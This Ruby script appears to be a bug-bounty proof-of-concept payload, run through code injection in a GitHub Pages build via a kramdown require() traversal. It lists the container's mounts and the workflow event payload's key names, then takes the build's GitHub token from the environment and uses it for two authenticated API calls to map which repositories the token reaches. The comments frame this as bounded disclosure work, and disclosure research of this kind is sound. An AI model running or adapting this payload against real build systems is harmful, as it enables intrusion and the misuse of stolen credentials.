# Filesystem census of a GitHub Pages build container, plus a MINIMAL
# characterisation of the token the build is handed.
#
# Reached as before: _config.yml -> kramdown.input -> require() traversal.
#
# WHY THE TOKEN PART IS IN BOUNDS. Two program rules, read together:
#   "Never use a credential to read data, change state, or move further into
#    our systems."
#   "We need to know that a credential is live and what it reaches. Do not test
#    beyond the minimum needed to confirm validity, but do tell us what you did
#    confirm: which service it belongs to, what a successful call returned, and
#    roughly what access it implies."
# So validity + reach is the documented evidence bar. Going past it is not.
#
# BOUNDS, enforced below:
#   - TWO authenticated calls, both metadata-only:
#       GET /            -> returns a URL map, no data at all
#       GET /installation/repositories -> the token's OWN reach, i.e. scope
#     If the second returns anything other than this repository, the probe
#     PRINTS THE COUNT AND NAMES AND STOPS. It does not read any of them.
#   - No write of any kind. No other endpoint. No retries.
#   - Token VALUE is never printed: prefix and length only. The value is not
#     what makes or breaks this finding, the reach is.
#   - Filesystem walk is depth- and count-capped and reads no file contents
#     except a size-capped peek at the workflow event payload's KEY NAMES.

require "json"
require "net/http"
require "uri"
require "etc"

OUT = []
def say(s) OUT << s end

MOUNTS = [
  "/github/workspace",
  "/github/home",
  "/github/workflow",
  "/github/file_commands",
  "/github/runner_temp",
  "/root",
]

def owner(st)
  u = (Etc.getpwuid(st.uid).name rescue st.uid)
  g = (Etc.getgrgid(st.gid).name rescue st.gid)
  "#{u}:#{g}"
end

say "== runtime mount census =="
MOUNTS.each do |m|
  unless File.exist?(m)
    say "  #{m}  ABSENT"
    next
  end
  st = File.stat(m) rescue nil
  say "  #{m}  dir mode=#{st ? format('%o', st.mode & 0o7777) : '?'} owner=#{st ? owner(st) : '?'}"
  n = 0
  begin
    Dir.glob(File.join(m, "**", "*"), File::FNM_DOTMATCH).each do |p|
      next if p =~ %r{/\.\.?\z}
      break if n >= 40
      s = File.lstat(p) rescue next
      kind = s.directory? ? "d" : (s.symlink? ? "l" : "f")
      extra = s.symlink? ? " -> #{(File.readlink(p) rescue '?')}" : ""
      say "      #{kind} #{format('%6d', s.size)} #{format('%o', s.mode & 0o7777)} #{owner(s)}  #{p.sub(m + '/', '')}#{extra}"
      n += 1
    end
    say "      (listing capped at 40)" if n >= 40
    say "      (empty)" if n.zero?
  rescue Exception => e
    say "      walk error #{e.class}"
  end
end

# the workflow event payload: KEY NAMES only, never values
say "== workflow event payload, key names only =="
ev = ENV["GITHUB_EVENT_PATH"].to_s
if ev.empty? || !File.exist?(ev)
  say "  GITHUB_EVENT_PATH=#{ev.inspect} not present"
else
  st = File.stat(ev)
  say "  #{ev}  size=#{st.size} mode=#{format('%o', st.mode & 0o7777)} owner=#{owner(st)}"
  begin
    j = JSON.parse(File.read(ev, 300_000))
    say "  top-level keys: #{j.keys.sort.join(',')}" if j.is_a?(Hash)
    if j.is_a?(Hash) && j["repository"].is_a?(Hash)
      say "  repository.full_name=#{j['repository']['full_name']} private=#{j['repository']['private']}"
    end
  rescue Exception => e
    say "  parse error #{e.class}"
  end
end

# ---------- token characterisation: validity and REACH, nothing more ----------
say "== token characterisation (prefix and length only; value never printed) =="
tok = ENV["INPUT_TOKEN"].to_s
tok = ENV["JEKYLL_GITHUB_TOKEN"].to_s if tok.empty?
if tok.empty?
  say "  no token in INPUT_TOKEN or JEKYLL_GITHUB_TOKEN"
else
  say "  prefix=#{tok[0, 4]} length=#{tok.length}"
  say "  (entrypoint.sh exports INPUT_TOKEN as JEKYLL_GITHUB_TOKEN; both present=#{!ENV['JEKYLL_GITHUB_TOKEN'].to_s.empty?})"

  def api(path, tok)
    u = URI("https://api.github.com#{path}")
    h = Net::HTTP.new(u.host, 443)
    h.use_ssl = true
    h.open_timeout = 5
    h.read_timeout = 5
    rq = Net::HTTP::Get.new(u)
    rq["Authorization"] = "Bearer #{tok}"
    rq["Accept"] = "application/vnd.github+json"
    rq["X-GitHub-Api-Version"] = "2022-11-28"
    r = h.request(rq)
    [r.code, r, r.body.to_s]
  rescue Exception => e
    ["ERR", nil, e.class.to_s]
  end

  # CALL 1: API root. Returns a URL map and no data whatsoever.
  code, resp, _ = api("/", tok)
  say "  CALL 1  GET /  -> #{code}   (URL map only, discloses nothing)"
  if resp
    %w[x-oauth-scopes x-accepted-oauth-scopes x-github-api-version-selected x-ratelimit-limit].each do |hh|
      say "            #{hh}: #{resp[hh].inspect}"
    end
  end

  # CALL 2: the token's OWN reach. This is scope, not content.
  code2, _, body2 = api("/installation/repositories", tok)
  say "  CALL 2  GET /installation/repositories  -> #{code2}   (the token's reach)"
  begin
    j = JSON.parse(body2)
    if j.is_a?(Hash) && j["total_count"]
      say "            total_count=#{j['total_count']}"
      names = (j["repositories"] || []).map { |r| "#{r['full_name']}(private=#{r['private']})" }
      say "            repositories=#{names.join(' ')}"
      if j["total_count"].to_i > 1
        say "            *** REACHES MORE THAN THIS REPOSITORY - STOPPING HERE, NOTHING READ ***"
      end
    else
      say "            body: #{body2[0, 160]}"
    end
  rescue Exception
    say "            body: #{body2[0, 160]}"
  end
end

say "== END =="

body = OUT.join("\n")
begin
  File.write("/github/workspace/CENSUS.txt", body + "\n")
rescue Exception
end
STDERR.puts "F007_CENSUS_BEGIN\n" + body + "\nF007_CENSUS_END"
raise "F007_CENSUS_DONE"
